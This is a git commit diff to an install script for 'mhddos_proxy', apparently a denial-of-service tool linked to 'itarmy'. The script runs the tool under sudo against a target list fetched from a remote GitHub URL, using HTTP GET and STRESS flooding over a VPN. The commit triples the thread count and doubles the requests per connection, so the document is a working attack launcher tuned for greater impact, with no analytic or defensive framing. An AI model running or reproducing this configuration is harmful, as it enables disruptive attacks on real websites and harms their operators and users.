a69bede008eec81515a5874bc89cc80a63bcf6e2
Иван Орищенко <44241496+ifest1val@users.noreply.github.com>
2022-04-26 18:22:11 +0300

    Update install.sh

--- install/install.sh
+++ install/install.sh
@@ -9,4 +9,4 @@ cd mhddos_proxy/
 ulimit -n 1048576
 sudo python3 -m pip install -r requirements.txt
 cd mhddos_proxy/
-screen -S "run" sudo  python3 runner.py -c https://raw.githubusercontent.com/ifest1val/itarmy/main/address/pack_1 -t 500 --rpc 1000 --http-methods GET STRESS --debug --vpn
+screen -S "run" sudo  python3 runner.py -c https://raw.githubusercontent.com/ifest1val/itarmy/main/address/pack_1 -t 1500 --rpc 2000 --http-methods GET STRESS --debug --vpn
